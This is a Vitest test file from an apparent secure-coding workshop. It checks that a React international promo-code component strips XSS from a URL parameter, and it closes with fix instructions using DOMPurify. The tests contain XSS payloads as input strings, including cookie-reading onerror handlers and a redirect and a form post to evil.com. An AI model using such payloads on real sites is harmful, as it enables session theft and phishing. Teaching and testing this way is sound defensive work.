/**
 * Security Tests for International Promo Codes Component
 * 
 * These tests verify that the component properly sanitizes user input
 * to prevent XSS attacks, even when using i18n translation libraries.
 * 
 * Workshop participants should make promo-codes-international-task.jsx pass all these tests.
 */

import { describe, it, expect, beforeEach, vi } from 'vitest';
import { render, screen } from '@testing-library/react';
import RedeemPromoInt from './promo-codes-international-task';

// Mock window.location
const mockLocation = {
  search: '',
  href: ''
};

beforeEach(() => {
  vi.stubGlobal('location', mockLocation);
  mockLocation.search = '';
});

describe('International Promo Codes Security Tests', () => {
  
  describe('XSS Prevention - Script Tags', () => {
    it('should not execute script tags in promo code', () => {
      mockLocation.search = '?promo=<script>alert("XSS")</script>';
      
      const { container } = render(<RedeemPromoInt />);
      
      const scripts = container.querySelectorAll('script');
      expect(scripts.length).toBe(0);
      expect(container.innerHTML).not.toContain('<script>');
    });

    it('should sanitize script tags even with i18n interpolation', () => {
      mockLocation.search = '?promo=PROMO<script>document.location="http://evil.com"</script>';
      
      const { container } = render(<RedeemPromoInt />);
      
      expect(container.innerHTML).not.toContain('<script>');
      expect(container.innerHTML).not.toContain('document.location');
    });
  });

  describe('XSS Prevention - Event Handlers', () => {
    it('should not render onerror event handlers', () => {
      mockLocation.search = '?promo=<img src="x" onerror="alert(document.cookie)">';
      
      const { container } = render(<RedeemPromoInt />);
      
      expect(container.innerHTML).not.toContain('onerror');
    });

    it('should not render onclick event handlers', () => {
      mockLocation.search = '?promo=<div onclick="stealData()">CLICK ME</div>';
      
      const { container } = render(<RedeemPromoInt />);
      
      expect(container.innerHTML).not.toContain('onclick');
    });

    it('should not render onmouseover event handlers', () => {
      mockLocation.search = '?promo=<span onmouseover="malicious()">hover</span>';
      
      const { container } = render(<RedeemPromoInt />);
      
      expect(container.innerHTML).not.toContain('onmouseover');
    });
  });

  describe('XSS Prevention - JavaScript URLs', () => {
    it('should not render javascript: protocol', () => {
      mockLocation.search = '?promo=<a href="javascript:alert(\'XSS\')">Free Stuff!</a>';
      
      const { container } = render(<RedeemPromoInt />);
      
      expect(container.innerHTML).not.toContain('javascript:');
    });
  });

  describe('XSS Prevention - Template Injection', () => {
    it('should prevent breaking out of i18n template', () => {
      // Attempt to break out of translation template
      mockLocation.search = '?promo=</strong></p><script>evil()</script><p><strong>';
      
      const { container } = render(<RedeemPromoInt />);
      
      expect(container.innerHTML).not.toContain('<script>');
    });
  });

  describe('XSS Prevention - SVG Attacks', () => {
    it('should sanitize SVG with embedded JavaScript', () => {
      mockLocation.search = '?promo=<svg><script>alert("XSS")</script></svg>';
      
      const { container } = render(<RedeemPromoInt />);
      
      expect(container.innerHTML).not.toContain('<script>');
    });

    it('should sanitize SVG onload events', () => {
      mockLocation.search = '?promo=<svg onload="alert(\'XSS\')"></svg>';
      
      const { container } = render(<RedeemPromoInt />);
      
      expect(container.innerHTML).not.toContain('onload');
    });
  });

  describe('XSS Prevention - Form Attacks', () => {
    it('should sanitize form elements', () => {
      mockLocation.search = '?promo=<form action="http://evil.com/steal"><input name="data"></form>';
      
      const { container } = render(<RedeemPromoInt />);
      
      // Form should be sanitized
      expect(container.querySelectorAll('form[action]').length).toBe(0);
    });
  });

  describe('Safe Content Rendering', () => {
    it('should display normal promo codes safely', () => {
      mockLocation.search = '?promo=INTERNATIONAL50';
      
      render(<RedeemPromoInt />);
      
      expect(screen.getByText(/INTERNATIONAL50/)).toBeInTheDocument();
    });

    it('should render language switch buttons', () => {
      mockLocation.search = '?promo=TEST';
      
      render(<RedeemPromoInt />);
      
      expect(screen.getByText('English')).toBeInTheDocument();
      expect(screen.getByText('French')).toBeInTheDocument();
    });
  });
});

/**
 * WORKSHOP INSTRUCTIONS:
 * 
 * The promo-codes-international-task.jsx file has a security vulnerability.
 * Even though it uses dangerouslySetInnerHTML with i18n translations,
 * the promo code from the URL is not sanitized before being interpolated.
 * 
 * To fix the vulnerability:
 * 
 * 1. Import DOMPurify:
 *    import Dompurify from 'dompurify';
 * 
 * 2. Sanitize the promo code BEFORE setting state:
 *    setPromoCode(Dompurify.sanitize(promo, {
 *      ALLOWED_TAGS: ['strong'],
 *    }));
 * 
 * This ensures that even when the promo code is interpolated into
 * the i18n translation, it's already sanitized.
 * 
 * Compare your fix with promo-codes-international.jsx to see the complete implementation.
 */
